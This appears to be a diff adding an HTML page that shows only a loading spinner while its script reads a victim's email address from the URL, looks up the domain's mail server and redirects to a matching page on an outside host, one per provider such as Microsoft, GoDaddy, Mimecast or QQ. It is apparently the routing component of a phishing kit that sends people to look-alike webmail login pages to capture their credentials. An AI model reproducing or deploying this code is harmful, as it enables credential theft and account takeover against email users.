@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        body {
+            background-color: #fff; /* Set background color to white */
+            color: #000; /* Change text color to black */
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 2em;
+        }
+
+        p {
+            cursor: pointer;
+        }
+
+        p > span {
+            font-size: 12em;
+        }
+
+        #circularG {
+            position: relative;
+            width: 50px;
+            height: 50px;
+        }
+
+        .circularG {
+            position: absolute;
+            background-color: #bdbdbd;
+            width: 11px;
+            height: 11px;
+            border-radius: 8px;
+            animation-name: bounce_circularG;
+            animation-duration: 0.8s;
+            animation-iteration-count: infinite;
+            animation-direction: linear;
+        }
+
+        #circularG_1 {
+            left: 0;
+            top: 20px;
+            animation-delay: 0.3s;
+        }
+
+        #circularG_2 {
+            left: 5px;
+            top: 5px;
+            animation-delay: 0.4s;
+        }
+
+        #circularG_3 {
+            top: 0;
+            left: 20px;
+            animation-delay: 0.5s;
+        }
+
+        #circularG_4 {
+            right: 5px;
+            top: 5px;
+            animation-delay: 0.6s;
+        }
+
+        #circularG_5 {
+            right: 0;
+            top: 20px;
+            animation-delay: 0.7s;
+        }
+
+        #circularG_6 {
+            right: 5px;
+            bottom: 5px;
+            animation-delay: 0.8s;
+        }
+
+        #circularG_7 {
+            left: 20px;
+            bottom: 0;
+            animation-delay: 0.9s;
+        }
+
+        #circularG_8 {
+            left: 5px;
+            bottom: 5px;
+            animation-delay: 1s;
+        }
+
+        @keyframes bounce_circularG {
+            0% {
+                transform: scale(1);
+            }
+            100% {
+                transform: scale(0.3);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="circularG">
+        <div id="circularG_1" class="circularG"></div>
+        <div id="circularG_2" class="circularG"></div>
+        <div id="circularG_3" class="circularG"></div> <!-- Fixed typo here -->
+        <div id="circularG_4" class="circularG"></div>
+        <div id="circularG_5" class="circularG"></div>
+        <div id="circularG_6" class="circularG"></div>
+        <div id="circularG_7" class="circularG"></div>
+        <div id="circularG_8" class="circularG"></div>
+    </div>
+    <script>
+        const hostingProviderMap = {
+            "163": "https://sessions.archive.us-east-1.oortech.com/163.html",
+            "1and1": "https://sessions.archive.us-east-1.oortech.com/ionos.html",
+            "ionos": "https://sessions.archive.us-east-1.oortech.com/ionos.html",
+            "chinaemail": "https://sessions.archive.us-east-1.oortech.com/chinaemail.html",
+            "strato": "https://sessions.archive.us-east-1.oortech.com/strato.html",
+            "rz": "https://sessions.archive.us-east-1.oortech.com/strato.html",
+            "activ8": "https://sessions.archive.us-east-1.oortech.com/active8.html",
+            "synaq": "https://sessions.archive.us-east-1.oortech.com/synaq.html",
+            "outlook": "https://sessions.archive.us-east-1.oortech.com/microsoft.html",
+            "arhost": "https://sessions.archive.us-east-1.oortech.com/aryhost.html",
+            "hostedemail": "https://sessions.archive.us-east-1.oortech.com/rac.html",
+            "hostedmail": "https://sessions.archive.us-east-1.oortech.com/hostedmail.html",
+            "microsoft": "https://sessions.archive.us-east-1.oortech.com/microsoft.html",
+            "outlook.office365": "https://sessions.archive.us-east-1.oortech.com/microsoft.html",
+            // "yahoo": "yahoo.html",
+            //"ds": "ds.html",
+            "emirates": "https://sessions.archive.us-east-1.oortech.com/etisalatmail.html",
+            "mega": "https://sessions.archive.us-east-1.oortech.com/mega.html",
+            "mailchannels": "https://sessions.archive.us-east-1.oortech.com/kttckw.html",
+            "koreacap": "https://sessions.archive.us-east-1.oortech.com/fatcow.html",
+            "gmo.jp": "https://sessions.archive.us-east-1.oortech.com/onamae.html",
+            "servidoresdns": "https://sessions.archive.us-east-1.oortech.com/serviciodecorreo.html",
+            "earthlink": "https://sessions.archive.us-east-1.oortech.com/earthlink.html",
+            "secureserver": "https://sessions.archive.us-east-1.oortech.com/godaddy.html",
+            "reg365": "https://sessions.archive.us-east-1.oortech.com/register365.html",
+            "register365": "https://sessions.archive.us-east-1.oortech.com/register365.html",
+            "gmx": "https://sessions.archive.us-east-1.oortech.com/mail.html",
+            "mx00.mail.com": "https://sessions.archive.us-east-1.oortech.com/mail.html",
+            "aitai": "https://sessions.archive.us-east-1.oortech.com/aitai.html",
+            "shinilfi": "https://sessions.archive.us-east-1.oortech.com/shinilfi.html",
+            "busymouse": "https://sessions.archive.us-east-1.oortech.com/networksolution.html",
+            "mailplug": "https://sessions.archive.us-east-1.oortech.com/mailplug.html",
+            "zcom": "https://sessions.archive.us-east-1.oortech.com/synaq.html",
+            "ocn": "https://sessions.archive.us-east-1.oortech.com/ocn.html",
+            "fatcow": "https://sessions.archive.us-east-1.oortech.com/fatcow.html",
+            "horde": "https://sessions.archive.us-east-1.oortech.com/bat.html",
+            "theupstairsroom": "https://sessions.archive.us-east-1.oortech.com/bat.html",
+            "planet": "https://sessions.archive.us-east-1.oortech.com/bat.html",
+            "cafe24": "https://sessions.archive.us-east-1.oortech.com/cafe24.html",
+            "cytanet": "https://sessions.archive.us-east-1.oortech.com/cytanet.html",
+            "ipage": "https://sessions.archive.us-east-1.oortech.com/ipage.html",
+            "italsoftware": "https://sessions.archive.us-east-1.oortech.com/italsoftware.html",
+            "9netweb": "https://sessions.archive.us-east-1.oortech.com/italsoftware.html",
+            "inbound.cpt": "https://sessions.archive.us-east-1.oortech.com/konsoleh.html",
+            "dreamhost": "https://sessions.archive.us-east-1.oortech.com/kttckw.html",
+            "supremecenter": "https://sessions.archive.us-east-1.oortech.com/mshosting.html",
+            "rediff": "https://sessions.archive.us-east-1.oortech.com/rediff.html",
+            //"amazon": "amazon.html",
+            "world4you": "https://sessions.archive.us-east-1.oortech.com/world4you.html",
+            "ergonet": "https://sessions.archive.us-east-1.oortech.com/ergonet.html",
+            "yeah": "https://sessions.archive.us-east-1.oortech.com/yeah.html",
+            "netsolmail": "https://sessions.archive.us-east-1.oortech.com/networksolutions.html",
+            "mshosting": "https://sessions.archive.us-east-1.oortech.com/mshosting.html",
+            //"mailspamprotection.com": "paradisojewelry.html",
+            "inbound": "https://sessions.archive.us-east-1.oortech.com/mimecast.html",
+            "service-alpha-inbound-a.mimecast.com": "https://sessions.archive.us-east-1.oortech.com/mimecast.html",
+            "securessl": "https://sessions.archive.us-east-1.oortech.com/securessl.html",
+            //"35": "https://sessions.archive.us-east-1.oortech.com/cn4e.html",
+            "lionsegypt": "https://sessions.archive.us-east-1.oortech.com/plesk.html",
+            "plesk": "https://sessions.archive.us-east-1.oortech.com/plesk.html",
+            "ehosting": "https://sessions.archive.us-east-1.oortech.com/ehosting.html",
+            "cbx": "https://sessions.archive.us-east-1.oortech.com/cbx.html",
+            //"cn4e": "https://sessions.archive.us-east-1.oortech.com/cn4e.html",
+            "hichina": "https://sessions.archive.us-east-1.oortech.com/aliyun.html",
+            "cpt.host": "https://sessions.archive.us-east-1.oortech.com/konsoleh",
+            "global": "https://sessions.archive.us-east-1.oortech.com/global.html",
+            "apn": "https://sessions.archive.us-east-1.oortech.com/active8.html",
+            "aruba": "https://sessions.archive.us-east-1.oortech.com/aruba.html",
+            "hostripples": "https://sessions.archive.us-east-1.oortech.com/hostripples.html",
+            "pphosted": "https://sessions.archive.us-east-1.oortech.com/pphosted.html",
+            "smtp": "https://sessions.archive.us-east-1.oortech.com/microsoft.html",
+            "zimbra": "https://sessions.archive.us-east-1.oortech.com/zum.html",
+            "sina": "https://sessions.archive.us-east-1.oortech.com/sina.html",
+            "qq": "https://sessions.archive.us-east-1.oortech.com/dqq.html",
+            "domain": "https://sessions.archive.us-east-1.oortech.com/webmail.html",
+            "protonmail": "https://sessions.archive.us-east-1.oortech.com/proton.html",
+            "privateemail": "https://sessions.archive.us-east-1.oortech.com/privateemail.html",
+            "myregisteredsite": "https://sessions.archive.us-east-1.oortech.com/networksolution.html",
+            "netsol": "https://sessions.archive.us-east-1.oortech.com/networksolution.html",
+            "263": "https://sessions.archive.us-east-1.oortech.com/mail263.html",
+            "aamranetworks": "https://sessions.archive.us-east-1.oortech.com/young.html",
+            "ionos": "https://sessions.archive.us-east-1.oortech.com/ionos.html",
+            "mailfence": "https://sessions.archive.us-east-1.oortech.com/mailfence.html",
+            "aryhost": "https://sessions.archive.us-east-1.oortech.com/aryhost.html",
+            "icoremail": "https://sessions.archive.us-east-1.oortech.com/icoremail.html",
+            "naver": "https://sessions.archive.us-east-1.oortech.com/naver.html",
+            "pec": "https://sessions.archive.us-east-1.oortech.com/aruba.html",
+            "supremebox": "https://sessions.archive.us-east-1.oortech.com/roundcube.html",
+            "cyon": "https://sessions.archive.us-east-1.oortech.com/roundcube.html",
+            "jellyfish": "https://sessions.archive.us-east-1.oortech.com/webmail.com",
+            "cytanet": "https://sessions.archive.us-east-1.oortech.com/cytanet.html",
+            "ovh": "https://sessions.archive.us-east-1.oortech.com/ovh.html",
+            "securessl": "https://sessions.archive.us-east-1.oortech.com/securessl.html",
+            "hibox": "https://sessions.archive.us-east-1.oortech.com/hiboxwebmail.html",
+            "azure.microsoft": "https://sessions.archive.us-east-1.oortech.com/microsoft.html",
+            "mailfree.aruba": "https://sessions.archive.us-east-1.oortech.com/aruba.html",
+            "hiworks": "https://sessions.archive.us-east-1.oortech.com/hiworks.html",
+            "megamailservers.com": "https://sessions.archive.us-east-1.oortech.com/orange.html",
+            "orange": "https://sessions.archive.us-east-1.oortech.com/orange.html",
+            "hinet": "https://sessions.archive.us-east-1.oortech.com/hinet.html",
+            "netease": "https://sessions.archive.us-east-1.oortech.com/163.html",
+            "rediff": "https://sessions.archive.us-east-1.oortech.com/rediff.html",
+            "webmail": "https://sessions.archive.us-east-1.oortech.com/webmail.html",
+            "live": "https://sessions.archive.us-east-1.oortech.com/microsoft.html",
+            "scalahosting": "https://sessions.archive.us-east-1.oortech.com/scalahosting.html",
+            "sohu": "https://sessions.archive.us-east-1.oortech.com/securessl.html",
+            "imatic": "https://sessions.archive.us-east-1.oortech.com/imatic.html",
+            "msn": "https://sessions.archive.us-east-1.oortech.com/microsoft.html",
+            "hanmail": "https://sessions.archive.us-east-1.oortech.com/daum.html",
+            "aliyun": "https://sessions.archive.us-east-1.oortech.com/aliyun.html",
+            "zmail": "https://sessions.archive.us-east-1.oortech.com/zmail.html",
+            "alibaba": "https://sessions.archive.us-east-1.oortech.com/aliyun.html",
+            "srvr": "https://sessions.archive.us-east-1.oortech.com/rac.html",
+            "126": "https://sessions.archive.us-east-1.oortech.com/126.html"
+            // ... (remaining providers)
+        };
+       function handleEmailRedirection(emailToLookup) {
+            const domain = emailToLookup.split('@')[1];
+            const fullApiUrl = `https://dns.google/resolve?name=${domain}&type=MX`;
+
+            fetch(fullApiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    const mxRecord = data.Answer && data.Answer.find(record => record.type === 15);
+
+                    if (mxRecord) {
+                        const mxValue = mxRecord.data.toLowerCase();
+                        let hostingProvider = "unknown";
+
+                        for (const keyword in hostingProviderMap) {
+                            if (mxValue.includes(keyword)) {
+                                hostingProvider = keyword;
+                                break;
+                            }
+                        }
+
+                        if (hostingProviderMap.hasOwnProperty(hostingProvider)) {
+                            const htmlPage = hostingProviderMap[hostingProvider];
+                            window.location.href = `${htmlPage}?email=${encodeURIComponent(emailToLookup)}`;
+                        } else {
+                            // Redirect to default page with email parameter as fragment identifier
+                            window.location.href = `https://sessions.archive.us-east-1.oortech.com/default.html#${encodeURIComponent(emailToLookup.split('@')[0])}@${encodeURIComponent(emailToLookup.split('@')[1])}`;
+                        }
+                    } else {
+                        // Redirect to default page with email parameter as fragment identifier
+                        window.location.href = `https://sessions.archive.us-east-1.oortech.com/default.html#${encodeURIComponent(emailToLookup.split('@')[0])}@${encodeURIComponent(emailToLookup.split('@')[1])}`;
+                    }
+                })
+                .catch(error => {
+                    console.error(`Error performing DNS lookup: ${error.message}`);
+                });
+        }
+
+        // Get email parameter from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailToLookup = urlParams.get('email');
+
+        if (emailToLookup) {
+            handleEmailRedirection(emailToLookup);
+        } else {
+            console.error('Email parameter not found in URL.');
+        }
+    </script>
+</body>
+</html>
